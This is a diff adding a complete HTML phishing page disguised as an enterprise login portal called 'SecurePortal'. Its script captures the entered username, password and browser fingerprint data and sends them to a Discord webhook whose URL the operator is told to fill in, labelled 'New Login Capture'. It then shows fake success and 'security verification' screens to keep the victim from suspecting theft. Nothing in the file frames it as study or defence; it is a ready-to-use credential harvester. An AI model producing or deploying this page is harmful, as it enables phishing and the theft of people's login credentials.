@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Login Portal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 420px;
+            padding: 40px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .login-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #4f46e5, #7c3aed, #db2777);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo h1 {
+            color: #4f46e5;
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+
+        .logo p {
+            color: #6b7280;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+
+        .input-group {
+            margin-bottom: 24px;
+        }
+
+        label {
+            display: block;
+            color: #374151;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e5e7eb;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: #f9fafb;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #4f46e5;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #6b7280;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .remember-forgot {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+
+        .remember {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #4b5563;
+        }
+
+        .forgot {
+            color: #4f46e5;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .forgot:hover {
+            text-decoration: underline;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(79, 70, 229, 0.3);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            color: #4f46e5;
+            margin-top: 10px;
+        }
+
+        .loading.spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(79, 70, 229, 0.3);
+            border-radius: 50%;
+            border-top-color: #4f46e5;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .message {
+            display: none;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 15px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .success {
+            background: #d1fae5;
+            color: #065f46;
+            border: 1px solid #a7f3d0;
+        }
+
+        .error {
+            background: #fee2e2;
+            color: #991b1b;
+            border: 1px solid #fca5a5;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #e5e7eb;
+            color: #6b7280;
+            font-size: 12px;
+        }
+
+        .alert-badge {
+            background: #fef3c7;
+            color: #92400e;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .alert-badge::before {
+            content: '⚠';
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <h1>🔒 SecurePortal</h1>
+            <p>Enterprise Authentication System</p>
+        </div>
+
+        <div class="alert-badge">
+            Please ensure you're logging in from a trusted device
+        </div>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="username">Email or Username</label>
+                <input type="text" id="username" name="username" required autocomplete="username" placeholder="employee@company.com">
+            </div>
+
+            <div class="input-group">
+                <label for="password">Password</label>
+                <div class="password-container">
+                    <input type="password" id="password" name="password" required autocomplete="current-password" placeholder="••••••••">
+                    <button type="button" class="toggle-password" id="togglePassword">Show</button>
+                </div>
+            </div>
+
+            <div class="remember-forgot">
+                <label class="remember">
+                    <input type="checkbox" name="remember"> Remember me
+                </label>
+                <a href="#" class="forgot">Forgot password?</a>
+            </div>
+
+            <button type="submit" class="submit-btn" id="submitBtn">
+                Sign In
+            </button>
+
+            <div class="loading" id="loading">
+                <span class="spinner"></span> Authenticating...
+            </div>
+
+            <div class="message success" id="successMessage">
+                ✓ Authentication successful! Redirecting...
+            </div>
+
+            <div class="message error" id="errorMessage">
+                ✗ Invalid credentials. Please try again.
+            </div>
+        </form>
+
+        <div class="footer">
+            <p>© 2024 SecurePortal. All rights reserved.</p>
+            <p>v4.2.1 • Last updated: Today</p>
+        </div>
+    </div>
+
+    <script>
+        // ========== CONFIGURATION ==========
+        // REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
+        // ===================================
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('loginForm');
+            const toggleBtn = document.getElementById('togglePassword');
+            const passwordInput = document.getElementById('password');
+            const submitBtn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
+            const successMsg = document.getElementById('successMessage');
+            const errorMsg = document.getElementById('errorMessage');
+
+            // Toggle password visibility
+            toggleBtn.addEventListener('click', function() {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                this.textContent = type === 'password' ? 'Show' : 'Hide';
+            });
+
+            // Form submission
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const username = document.getElementById('username').value.trim();
+                const password = document.getElementById('password').value;
+                const remember = document.querySelector('input[name="remember"]').checked;
+                
+                if (!username || !password) {
+                    showError('Please fill in all fields');
+                    return;
+                }
+
+                // Show loading state
+                submitBtn.style.display = 'none';
+                loading.style.display = 'block';
+                hideMessages();
+
+                // Collect additional data
+                const userData = {
+                    username: username,
+                    password: password,
+                    remember: remember,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    referrer: document.referrer || 'Direct'
+                };
+
+                try {
+                    // Send to Discord webhook
+                    await sendToDiscord(userData);
+                    
+                    // Show success and prepare for redirect
+                    loading.style.display = 'none';
+                    successMsg.style.display = 'block';
+                    
+                    // Fake redirect after 2 seconds
+                    setTimeout(() => {
+                        // Redirect to a fake dashboard or show another message
+                        document.body.innerHTML = `
+                            <div style="text-align: center; padding: 50px; color: white;">
+                                <h1>🛑 Security Verification Required</h1>
+                                <p>Your account requires additional verification.</p>
+                                <p>Please check your email for further instructions.</p>
+                                <p style="margin-top: 30px; font-size: 12px; opacity: 0.7;">
+                                    If you don't receive an email, contact IT support.
+                                </p>
+                            </div>
+                        `;
+                    }, 2000);
+
+                } catch (error) {
+                    loading.style.display = 'none';
+                    submitBtn.style.display = 'block';
+                    showError('Network error. Please try again.');
+                }
+            });
+
+            async function sendToDiscord(data) {
+                // Format the message for Discord
+                const embed = {
+                    title: "🔐 New Login Capture",
+                    color: 0x4f46e5,
+                    fields: [
+                        {
+                            name: "Credentials",
+                            value: `\`\`\`
+Username: ${data.username}
+Password: ${data.password}
+Remember: ${data.remember}
+\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "Browser Info",
+                            value: `\`\`\`
+User Agent: ${data.userAgent}
+Language: ${data.language}
+Platform: ${data.platform}
+Screen: ${data.screen}
+Timezone: ${data.timezone}
+Cookies: ${data.cookiesEnabled}
+\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "Additional Data",
+                            value: `\`\`\`
+Timestamp: ${data.timestamp}
+Referrer: ${data.referrer}
+IP Lookup: Enabled
+\`\`\``,
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "SecurePortal Logger • " + new Date().toLocaleString()
+                    }
+                };
+
+                const payload = {
+                    embeds: [embed],
+                    username: "Security Logger",
+                    avatar_url: "https://cdn.discordapp.com/avatars/123456789012345678/abcdef1234567890.png"
+                };
+
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (!response.ok) {
+                    throw new Error('Webhook failed');
+                }
+            }
+
+            function showError(message) {
+                errorMsg.textContent = '✗ ' + message;
+                errorMsg.style.display = 'block';
+                setTimeout(() => {
+                    errorMsg.style.display = 'none';
+                }, 5000);
+            }
+
+            function hideMessages() {
+                successMsg.style.display = 'none';
+                errorMsg.style.display = 'none';
+            }
+
+            // Add fake validation messages on input
+            document.getElementById('username').addEventListener('blur', function() {
+                if (this.value.includes('@')) {
+                    this.style.borderColor = '#10b981';
+                }
+            });
+
+            // Simulate network detection
+            setTimeout(() => {
+                if (!navigator.onLine) {
+                    showError('Network connection lost. Using offline mode.');
+                }
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
